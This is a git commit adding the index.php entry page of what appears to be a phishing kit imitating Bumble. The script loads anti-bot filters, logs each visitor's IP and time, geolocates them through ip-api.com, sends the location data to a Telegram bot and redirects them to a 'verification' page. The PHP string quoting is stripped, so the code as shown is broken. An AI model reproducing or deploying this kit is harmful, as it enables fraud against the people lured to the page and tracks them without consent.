00f6c24d17cc697007bff2a4770fa6053b8dd93a
Bumble- <ibrahim.drissi@x-hub.io>
2024-04-22 20:11:19 +0100

    first commit

---
+++ index.php
@@ -0,0 +1,35 @@
+<?php
+
+include 'bots/anti1.php';
+include 'bots/anti2.php';
+include 'bots/anti3.php';
+include 'bots/anti4.php';
+include 'bots/anti5.php';
+include 'bots/anti6.php';
+include 'bots/anti7.php';
+include 'bots/anti8.php';
+include email.php;
+
+
+$ip = getenv(REMOTE_ADDR);
+
+
+$file = fopen(ARDUINO_DAS_VISIT.txt,a);
+
+
+fwrite($file,$ip.  -  .gmdate (Y-n-d). @ .gmdate (H:i:s).\n);
+
+$IP_LOOKUP = @json_decode(file_get_contents(http://ip-api.com/json/.$ip));
+$COUNTRY = $IP_LOOKUP->country . \r\n;
+$CITY    = $IP_LOOKUP->city . \r\n;
+$REGION  = $IP_LOOKUP->region . \r\n;
+$STATE   = $IP_LOOKUP->regionName . \r\n;
+$ZIPCODE = $IP_LOOKUP->zip . \r\n;
+
+$msg=$ip.\nCountry : .$COUNTRY.City:  .$CITY.Region :  .$REGION.State:  .$STATE.Zip :  .$ZIPCODE;
+
+file_get_contents(https://api.telegram.org/bot.$api./sendMessage?chat_id=.$chatid.&text= . urlencode($msg). );
+
+
+
+header(Location: verification/);
